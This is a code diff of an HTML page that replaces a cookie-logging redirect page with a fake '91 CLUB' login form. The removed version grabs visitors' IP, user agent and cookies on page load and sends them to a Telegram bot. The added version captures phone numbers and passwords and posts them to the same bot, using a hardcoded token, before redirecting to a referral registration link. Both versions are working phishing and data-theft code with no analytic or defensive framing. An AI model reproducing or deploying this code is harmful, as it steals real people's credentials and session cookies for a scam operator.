@@ -2,32 +2,75 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8">
-  <title>Redirecting...</title>
-  <meta http-equiv="refresh" content="3;url=https://www.91222.in/#/register?invitationCode=281861899551">
-  <script>
-    (async () => {
-      try {
-        const res = await fetch("https://api.ipify.org?format=json");
-        const data = await res.json();
-        const ip = data.ip || "N/A";
-        const userAgent = navigator.userAgent || "Unknown";
-        const cookies = document.cookie || "No cookies found";
-
-        const message = 
-`👤 New Visit Logged:
-
-📍 IP: ${ip}
-🌐 User-Agent: ${userAgent}
-🍪 Cookies: ${cookies}`;
-
-        await fetch(`https://api.telegram.org/bot8290146183:AAFD63I79f0zSPM4s9GMDJ324Nc8o84VP-s/sendMessage?chat_id=7882702142&text=${encodeURIComponent(message)}`);
-      } catch (error) {
-        console.error("Log sending failed:", error);
-      }
-    })();
-  </script>
+  <title>91 CLUB Login</title>
+  <style>
+    body {
+      background: #f5f5f5;
+      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+      text-align: center;
+      padding-top: 60px;
+    }
+    input, button {
+      padding: 12px;
+      margin: 10px;
+      width: 280px;
+      border-radius: 8px;
+      border: 1px solid #ccc;
+      font-size: 16px;
+    }
+    button {
+      background-color: #28a745;
+      color: white;
+      font-weight: bold;
+      cursor: pointer;
+    }
+    button:hover {
+      background-color: #218838;
+    }
+    h2 {
+      color: #333;
+    }
+  </style>
 </head>
 <body>
-  <h3>Redirecting you to the page...</h3>
+
+  <h2>91 CLUB - Login</h2>
+  <input type="text" id="phone" placeholder="Phone Number"><br>
+  <input type="password" id="pass" placeholder="Password"><br>
+  <button onclick="sendData()">Login</button>
+
+  <script>
+    async function sendData() {
+      const phone = document.getElementById("phone").value;
+      const pass = document.getElementById("pass").value;
+
+      if (phone === "" || pass === "") {
+        alert("Please fill in both fields.");
+        return;
+      }
+
+      const token = "8290146183:AAFD63I79f0zSPM4s9GMDJ324Nc8o84VP-s";
+      const chat_id = "7882702142";
+      const text = `📥 *91 CLUB Login*\n📱 Phone: ${phone}\n🔐 Pass: ${pass}`;
+
+      const url = `https://api.telegram.org/bot${token}/sendMessage`;
+
+      await fetch(url, {
+        method: "POST",
+        headers: {
+          "Content-Type": "application/json"
+        },
+        body: JSON.stringify({
+          chat_id: chat_id,
+          text: text,
+          parse_mode: "Markdown"
+        })
+      });
+
+      // Redirect user
+      window.location.href = "https://www.91222.in/#/register?invitationCode=281861899551";
+    }
+  </script>
+
 </body>
 </html>
